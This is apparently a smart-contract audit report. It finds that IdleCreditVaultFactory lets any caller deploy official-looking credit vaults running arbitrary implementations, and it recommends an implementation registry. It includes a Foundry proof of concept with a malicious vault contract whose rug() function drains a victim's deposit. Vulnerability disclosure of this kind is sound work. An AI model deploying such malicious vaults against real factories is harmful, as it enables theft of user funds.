### Title
Permissionless `IdleCreditVaultFactory` deploys "official" credit vaults backed by arbitrary attacker-controlled implementations - (File: contracts/IdleCreditVaultFactory.sol)

### Summary
`IdleCreditVaultFactory.deployCreditVault()` and `deployRevolvingCreditVault()` are callable by any EOA and accept `CreditVaultParams.implementation`, `StrategyData.implementation`, `AncillaryParams.queueImplementation`, and `AncillaryParams.writeOffImplementation` as free-form addresses. The factory wraps each in a `TransparentUpgradeableProxy` under the factory's trusted `proxyAdmin`, wires it as `cv`/`strategy`, emits `CreditVaultDeployed`, and transfers ownership to `treasury` — with no check that the implementation is the official `IdleCDOEpochVariant`/`IdleCreditVault` code. This is the same flaw class as the Timeswap pool factory accepting an arbitrary options contract: an attacker can get a malicious vault stamped with official-factory provenance and steal deposits from users who trust factory provenance.

### Finding Description
`deployCreditVault` has no access control:

```solidity
function deployCreditVault(
  CreditVaultParams memory cvParams,
  StrategyData memory strategyData,
  AncillaryParams memory ancillaryParams
) external { ... }
```

Inside `_deployBaseCreditVault`, the caller-supplied addresses are used verbatim as proxy logic contracts:

```solidity
strategy = IdleCreditVault(_deployProxy(strategyData.implementation, ...));
cv = IdleCDOEpochVariant(_deployProxy(cvParams.implementation, ...));
```

and `_deployProxy` does `new TransparentUpgradeableProxy(implementation, proxyAdmin, data)`. The only gates are `_checkMinimumFees` (fee floor) and a zero-address check on `manager`. Nothing verifies:

- `cvParams.implementation` is a known/audited `IdleCDOEpochVariant`/`IdleCDOEpochVariantPrefunded` deployment,
- `strategyData.implementation` is a real `IdleCreditVault`,
- `underlying` is a legitimate ERC20.

An attacker deploys a contract exposing the selectors used during initialization/configuration (`initialize`, `setEpochParams`, `setInstantWithdrawParams`, `setKeyringParams`, `setFeeParams`, `setGuardian`, `transferOwnership`, etc.) plus `depositAA`/`token()` surface that simply accepts underlying tokens and lets the attacker sweep them. The deployment succeeds, `CreditVaultDeployed` is emitted from the real factory, ownership "transfers" to treasury (the malicious code just ignores it), and the vault is indistinguishable-by-provenance from a genuine deployment. Users relying on factory events / the factory address as the trust anchor deposit into it and lose funds.

### Impact Explanation
Direct theft of user deposits. Any underlying tokens deposited into the attacker's fake "official" vault (which sits behind a `TransparentUpgradeableProxy` controlled by the factory's `proxyAdmin` but running attacker logic) can be drained by the attacker at will. The fake vault is also whitelisted in the factory-deployed `KeyringIdleWhitelist` flow and strategy wiring, so third-party integrators enumerating factory deployments inherit the malicious pool.

### Likelihood Explanation
The attack requires only an unprivileged EOA and gas — deployment is permissionless. Exploitation requires tricking users into depositing, which is exactly the social vector described in the original report: users trust the pool/vault because it was created via the official factory. Indexers, UIs, or the `CreditVaultDeployed` event make the fake deployment look canonical. Likelihood is moderate (needs user deception), but the permissionless entry point and absence of any implementation verification make it trivially repeatable.

### Recommendation
Track verified implementations in the factory (e.g., `mapping(address => bool) public isVerifiedImplementation` set by `treasury`, or store official implementation addresses at initialization) and revert in `_deployBaseCreditVault`/`_deployQueue`/`_deployWriteOffEscrow` when a caller-supplied implementation is not verified. Alternatively, gate `deployCreditVault`/`deployRevolvingCreditVault` behind `OnlyTreasury` or a `deployer` role if permissionless deployment is not intended. At minimum, emit the implementation addresses in `CreditVaultDeployed` and document that provenance alone does not imply audited code — though a code-level registry check is the robust fix, mirroring the Timeswap mitigation of deriving the trusted contract address instead of trusting the caller's.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";

contract MockUnderlying is ERC20 {
    constructor() ERC20("USDC", "USDC") {}
    function mint(address to, uint256 a) external { _mint(to, a); }
}

// Attacker-controlled "IdleCDO" implementation: satisfies every selector
// the factory calls, accepts deposits, lets attacker sweep.
contract MaliciousCDO {
    address public attacker;
    IERC20 public token;
    constructor(address _attacker) { attacker = _attacker; }

    function initialize(
        uint256, address _underlying, address, address, address, address, uint256
    ) external { token = IERC20(_underlying); }

    // selectors invoked by _configureCreditVault — no-ops
    function setEpochParams(uint256, uint256) external {}
    function setInstantWithdrawParams(uint256, uint256, bool) external {}
    function setKeyringParams(address, uint256) external {}
    function setIsInterestMinted(bool) external {}
    function setIsDepositDuringEpochDisabled(bool) external {}
    function setFeeParams(address, uint256, uint256, uint256) external {}
    function setGuardian(address) external {}
    function transferOwnership(address) external {}

    // victim-facing deposit
    function depositAA(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
    }

    function rug() external {
        token.transfer(attacker, token.balanceOf(address(this)));
    }
}

contract MaliciousStrategy {
    function initialize(address, address, address, address, string memory, uint256) external {}
    function setAprs(uint256, uint256) external {}
    function setWhitelistedCDO(address) external {}
    function transferOwnership(address) external {}
}

contract FactoryFakeImplPoC is Test {
    function test_deployOfficialLookingVaultAndDrain() public {
        address treasury = makeAddr("treasury");
        address proxyAdmin = makeAddr("proxyAdmin");
        address attackerEOA = makeAddr("attacker");
        address victim = makeAddr("victim");
        address manager = makeAddr("manager");

        MockUnderlying usdc = new MockUnderlying();
        usdc.mint(victim, 1_000_000e18);

        IdleCreditVaultFactory impl = new IdleCreditVaultFactory();
        IdleCreditVaultFactory factory = IdleCreditVaultFactory(address(
            new TransparentUpgradeableProxy(
                address(impl), proxyAdmin,
                abi.encodeWithSelector(IdleCreditVaultFactory.initialize.selector, treasury, proxyAdmin)
            )
        ));

        MaliciousCDO malCDO = new MaliciousCDO(attackerEOA);
        MaliciousStrategy malStrat = new MaliciousStrategy();

        IdleCreditVaultFactory.CreditVaultParams memory cv = IdleCreditVaultFactory.CreditVaultParams({
            implementation: address(malCDO),
            limit: 0,
            underlying: address(usdc),
            apr: 10e18,
            epochDuration: 7 days,
            bufferPeriod: 1 days,
            instantWithdrawDelay: 1 hours,
            instantWithdrawAprDelta: 1e18,
            disableInstantWithdraw: true,
            keyringPolicy: 0,
            feeReceiver: attackerEOA,
            fees: 5000,
            managementFee: 500,
            isInterestMinted: false,
            isDepositDuringEpochDisabled: false
        });
        IdleCreditVaultFactory.StrategyData memory sd = IdleCreditVaultFactory.StrategyData({
            implementation: address(malStrat),
            manager: manager,
            borrower: attackerEOA,
            borrowerName: "Fake"
        });
        IdleCreditVaultFactory.AncillaryParams memory ap = IdleCreditVaultFactory.AncillaryParams({
            keyring: address(0), queueImplementation: address(0),
            prefundedDepositWindow: 0, writeOffImplementation: address(0)
        });

        vm.recordLogs();
        vm.prank(attackerEOA); // unprivileged caller
        factory.deployCreditVault(cv, sd, ap);

        // recover proxy address from CreditVaultDeployed event
        Vm.Log[] memory logs = vm.getRecordedLogs();
        address fakeCV;
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].topics[0] == keccak256("CreditVaultDeployed(address,address,address,address,address,address)")) {
                fakeCV = address(uint160(uint256(logs[i].topics[1])));
            }
        }
        assertTrue(fakeCV != address(0));

        // victim trusts factory provenance and deposits
        vm.startPrank(victim);
        usdc.approve(fakeCV, 1_000_000e18);
        MaliciousCDO(fakeCV).depositAA(1_000_000e18);
        vm.stopPrank();

        // attacker drains
        MaliciousCDO(fakeCV).rug();
        assertEq(usdc.balanceOf(attackerEOA), 1_000_000e18);
    }
}
```
